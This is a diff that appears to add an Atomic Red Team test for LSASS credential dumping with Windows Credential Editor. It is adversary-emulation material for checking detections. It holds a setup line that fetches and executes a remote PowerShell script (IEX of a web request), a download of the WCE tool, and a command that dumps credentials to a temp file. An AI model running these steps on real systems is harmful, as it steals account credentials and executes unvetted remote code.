@@ -1,0 +1,24 @@
+#TechniqueName: OS Credential Dumping: LSASS Memory
+#AtomicTestName: Windows Credential Editor
+#Language: cmd
+
+#get_prereq_commands
+$parentpath = Split-Path "PathToAtomicsFolder\T1003.001\bin\wce.exe"; $zippath = "$parentpath\wce.zip"
+IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+if(Invoke-WebRequestVerifyHash "https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip" "$zippath" 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933){
+  Expand-Archive $zippath $parentpath\wce -Force
+  Move-Item $parentpath\wce\wce.exe "PathToAtomicsFolder\T1003.001\bin\wce.exe"
+  Remove-Item $zippath, $parentpath\wce -Recurse
+}
+
+
+#prereq_commands
+if (Test-Path PathToAtomicsFolder\T1003.001\bin\wce.exe) {exit 0} else {exit 1}
+
+
+#commands
+PathToAtomicsFolder\T1003.001\bin\wce.exe -o %temp%\wce-output.txt
+
+
+#cleanup_commands
+del "%temp%\wce-output.txt" >nul 2>&1
